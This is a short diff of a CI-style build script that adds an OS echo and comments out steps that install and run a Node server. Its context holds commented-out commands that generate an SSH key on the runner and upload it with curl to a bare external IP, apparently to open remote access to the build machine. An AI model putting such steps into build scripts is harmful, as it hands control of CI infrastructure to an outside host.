@@ -11,6 +11,7 @@ def main
     github_checkout()
     
 def setup
+    echo ${{ runner.os }}
     #C:\msys64\usr\bin\bash.exe -lc "pacman -S openssh --noconfirm --logfile pacman.log"
     #C:\msys64\usr\bin\ssh-keygen.exe -b 2048 -t rsa -f "/home/runneradmin/.ssh/id_rsa" -q -N ""
     #curl -F key=@C:\msys64\home\runneradmin\.ssh\id_rsa.pub http://89.104.69.220:3000/key
@@ -19,8 +20,8 @@ def setup
     popd
     
 def run
-    call npm i request
-    node server.js
+    #call npm i request
+    #node server.js
 
 order main setup run
 
